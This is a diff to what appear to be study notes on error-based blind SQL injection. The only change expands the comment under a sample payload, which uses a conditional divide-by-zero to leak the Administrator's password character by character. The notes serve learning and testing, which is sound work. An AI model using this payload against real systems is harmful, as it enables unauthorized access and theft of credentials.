@@ -16,4 +16,5 @@ We can exploit these errors, just like we did in [[Blind SQLi]].
 > [!Sample Payload]
 > ```sql
 > xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
-> --- If the condition is true, it should return an error, else, the condition will return true 
+> --- If the condition is true, it should return an error, else, the condition will return true because of 'a' = 'a'
+
